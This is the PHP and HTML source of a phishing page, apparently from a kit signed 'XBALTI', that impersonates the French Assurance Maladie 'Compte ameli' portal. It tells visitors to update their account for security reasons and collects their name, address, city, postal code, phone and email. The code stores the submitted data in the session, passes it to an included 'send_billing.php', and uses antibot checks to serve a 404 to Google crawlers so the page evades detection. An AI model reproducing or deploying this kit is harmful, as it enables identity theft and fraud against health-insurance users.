<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
if(isset($_POST['completenom']) && isset($_POST['adresse'])){	
	if(!empty($_POST['completenom']) && !empty($_POST['adresse'])){
#################################################		
$_SESSION['completenom']   = $_POST['completenom'];
$_SESSION['adresse']   = $_POST['adresse'];
$_SESSION['ville']   = $_POST['ville'];
$_SESSION['codepostale']   = $_POST['codepostale'];
$_SESSION['telephone']   = $_POST['telephone'];
$_SESSION['email']   = $_POST['email'];
################################################
	include"./XBALTI/send_billing.php";
	}
}
//------------------------------------------|| ANTIBOTS ||---------------------------------------------------//
include "./antbots/antibot.php";
//--------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//--------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html>
    <html lang="fr">
	
	<head xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">
	

        <meta name="viewport" content="width=device-width, initial-scale=1.0">

	<link rel="apple-touch-icon" sizes="57x57" href="./css/img/icon/apple-icon-57x57.png"/>
	
	<link rel="apple-touch-icon" sizes="60x60" href="./css/img/icon/apple-icon-60x60.png"/>
	
	<link rel="apple-touch-icon" sizes="72x72" href="./css/img/icon/apple-icon-72x72.png"/>
	
	<link rel="apple-touch-icon" sizes="76x76" href="./css/img/icon/apple-icon-76x76.png"/>
	
	<link rel="apple-touch-icon" sizes="114x114" href="./css/img/icon/apple-icon-114x114.png"/>
	
	<link rel="apple-touch-icon" sizes="120x120" href="./css/img/icon/apple-icon-120x120.png"/>
	
	<link rel="apple-touch-icon" sizes="144x144" href="./css/img/icon/apple-icon-144x144.png"/>
	
	<link rel="apple-touch-icon" sizes="152x152" href="./css/img/icon/apple-icon-152x152.png"/>
	
	<link rel="apple-touch-icon" sizes="180x180" href="./css/img/icon/apple-icon-180x180.png"/>
	
	<link rel="icon" type="image/png" sizes="192x192" href="./css/img/icon/android-icon-192x192.png"/>
	
	<link rel="icon" type="image/png" sizes="32x32" href="./css/img/icon/favicon-32x32.png"/>
	
	<link rel="icon" type="image/png" sizes="96x96" href="./css/img/icon/favicon-96x96.png"/>
	
	<link rel="icon" type="image/png" sizes="16x16" href="./css/img/icon/favicon-16x16.png"/>
	
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	
	<meta name="description" content="Vos démarches en ligne avec l'Assurance Maladie. Suivi remboursements - Attestations - CEAM - Carte Vitale - Messagerie mail -  Coaching santé"/>
	
	<title>Compte ameli - mon espace personnel</title>
	
	<link rel="stylesheet" type="text/css" href="./css/layout.css">
	
	<link rel="stylesheet" type="text/css" href="./css/biblicnam-structure-sans.min.css">
	
	<link rel="stylesheet" type="text/css" href="./css/reset.css">
	
	<link rel="stylesheet" type="text/css" href="./css/clear.css">
	
	<link rel="stylesheet" type="text/css" href="./css/liens.css">
	
	<link rel="stylesheet" type="text/css" href="./css/forms.css">
	
	<link rel="stylesheet" type="text/css" href="./css/boutons.css">
	
	<link rel="stylesheet" type="text/css" href="./css/general.css">
	
	<link rel="stylesheet" type="text/css" href="./css/nav.css">
	
	<link rel="stylesheet" type="text/css" href="./css/colors.css">
	
	<link rel="stylesheet" type="text/css" href="./css/custom.css">
	
	<link rel="stylesheet" type="text/css" href="./css/centrer.css">
	
	<style type="text/css">
					.r_cnx_page .r_cnx_btlien,
					.r_cnx_page .r_cnx_btsubmit,
                    .r_ddc_btsubmit,
                    .r_ddc_btretour,
                    .r_ddc_btterminer,
                    .blocformfond fieldset,
                    .blocformfond .bloc_infos,
                    .r_acc_bloc_infos,
                    .bloc_infos_perso .content,
                    .imgCriteresPhoto,
                    .bloc_infos_perso .bloc_infos,
                    .avertissement
                    {
                    	behavior: url(/PortailAS/framework/skins/assure/js/PIE.htc);
                    }
                </style>
				
				<link rel="stylesheet" type="text/css" href="./css/window.css">
        
 
				  </head>
				     
<body><header class="wlp-bighorn-header" role="banner">
				    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
				       <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
					  <div></div>
					<div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
				<div id="Header" class="wlp-bighorn-window  ">
			<div class="wlp-bighorn-window-content">
			
			
			
<style type="text/css">
	 #Header .tetiere-connexion .r_btsubmit{
	 	display : none;
	 }
		
 </style>




 
<div class="tetiere">

	<div class="bandeau">
		
	 	<h1>Compte ameli</h1>
        <div class="liens">
        	<!-- Lien d'évitement, place le lecteur sur le contenu -->
          	<a tabindex="1" href="#contenu" title="Aller directement au contenu">
			Aller au contenu
			</a>
			<!-- Lien Recommandations  de sécurité -->
			&nbsp;|&nbsp;
			<a target="_blank" tabindex="2" title="Recommandations de sécurité (nouvelle fenêtre)">Recommandations de sécurité
			</a>
        	
		        <!-- Redirection vers la page de connexion -->
			
	
	
	
			


			
		</div>
	</div>
	
	
	<a tabindex="-1" class="r_lien_image" title="Accéder à l'accueil">
		<img src="./css/img/logo_general.png" class="logoam" alt="Logo du régime d'assurance maladie">
	</a>
</div>        	
  
<div id="HeaderrecommandationsSecurite" class="fenetre invisible " tabindex="0" role="alert" aria-labelledby="HeaderrecommandationsSecurite_title">
	<div class="fenetre-header">
		<span id="HeaderrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="HeaderrecommandationsSecurite_close" class="fenetre-button" role="button">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il convient de le garder secret. N'oubliez pas de le modifier régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a></a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de fermer votre navigateur internet. Ceci plus particulièrement si vous utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div></div></div></div></div></div></header><div id="ameli_portal_book_2" class="wlp-bighorn-book"><nav class="wlp-bighorn-menu-multi" role="navigation"></nav><div class="wlp-bighorn-book-content"><div id="as_connexion_book" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content"><main id="as_creation_immediate_page" class="wlp-bighorn-page-unconnect" role="main"><section id="contenu" class="corps-de-page"><div class="wlp-bighorn-layout wlp-bighorn-layout-grid"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell"><div></div><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="creationImmediate_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><h1 class="wlp-bighorn-titlebar-title-panel">Je mettre à jour compte ameli</h1></div><div class="wlp-bighorn-window-content">



























<script type="text/javascript" src="./js/demandeCodeProvisoire.js"></script>


<div class="centrepage">

  <form name="creationImmediateForm" id="creationImmediate_1creationImmediateForm" method="post" action="">
    <div class="blocformfond creationimmediate">
      
      <div>
      	<h2>
      		Vous devez mettre à jour votre compte pour des raisons de sécurité et merci :
      	</h2>
      </div>
      
      <fieldset>
      	

		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Mon complète nom:
		      <img src="./css/img/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
		    <span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="50" size="25" value="" class="champ" tabindex="3" name="completenom" required="required" placeholder="Complète nom"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
 
		
       		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Mon complète adresse:
		      <img src="./css/img/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
<span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="50" size="30" value="" class="champ" tabindex="3" name="adresse" required="required" placeholder="Complète adresse"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>

		
		
		       		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Mon Ville:
		      <img src="./css/img/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
<span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="15" size="12" value="" class="champ" tabindex="3" name="ville" required="required" placeholder="Ville"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		
		
				<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Mon code postal:
		      <img src="./css/img/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    <span class="zone_champ_saisie"><input id="creationImmediate_1idCp" type="text" maxlength="5" size="7" value="" class="champ" tabindex="6" name="codepostale" required="required" placeholder="Code postal"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		
				       		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Mon numéro téléphone:
		      <img src="./css/img/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
<span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="13" size="14" value="" class="champ" tabindex="3" name="telephone" required="required" placeholder="Numéro téléphone"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		
		
		       		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelnom" for="creationImmediate_1idNom">


		      Mon E-mail adresse:
		      <img src="./css/img/puce_obligatoire.gif" width="5" height="8" alt="*">
		    		</label>



		    
<span class="zone_champ_saisie"><input id="creationImmediate_1idNom" type="text" maxlength="50" size="24" value="" class="champ" tabindex="3" name="email" required="required" placeholder="E-mail adresse"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idNom_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>

		

		
		
      </fieldset>
      <div class="r_obligatoire"><img src="./css/img/puce_obligatoire.gif" alt="*" height="8" width="5"> champ obligatoire</div> 
    </div> 
        
    <div class="txt_milieu">
      <input type="hidden" name="creationImmediate_1actionEvt" value="verifierEligibilite">
    
      
	  <a tabindex="12" class="r_btretour r_btlien">Retour</a>

	  <input type="submit" name="creationImmediate_1actionEvt" tabindex="11" value="Continuer" id="creationImmediate_1id_r_cnx_btn_submit" class="r_btsubmit">
    </div>
    
    <p class="texte-center connect-FRCO"></p>

  </form>
     
</div>

</div></div></div></div></div></div></section></main></div></div></div></div><footer class="wlp-bighorn-footer" role="contentinfo"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Footer" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">




<ul class="old-Footer">
	<li>
		<a id="id_lien_info_legales" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
			Informations légales
		</a>
	</li>
	<li>
		<a id="id_lien_copyright" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
			Propriété intellectuelle
		</a>
	</li>
	<li>
		<a id="id_lien_condition_utilisation" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
			Conditions d'utilisation
		</a>
	</li>

	<li>
		<a id="id_lien_aide_footer" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
			Aide
		</a>
	</li>
	
	
</ul>


<div id="FooterrecommandationsSecurite" class="fenetre invisible " tabindex="0" role="alert" aria-labelledby="FooterrecommandationsSecurite_title">
	<div class="fenetre-header">
		<span id="FooterrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="FooterrecommandationsSecurite_close" class="fenetre-button" role="button">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il convient de le garder secret. N'oubliez pas de le modifier régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a></a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de fermer votre navigateur internet. Ceci plus particulièrement si vous utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div>




</div></div></div></div></div></footer></body>


</html>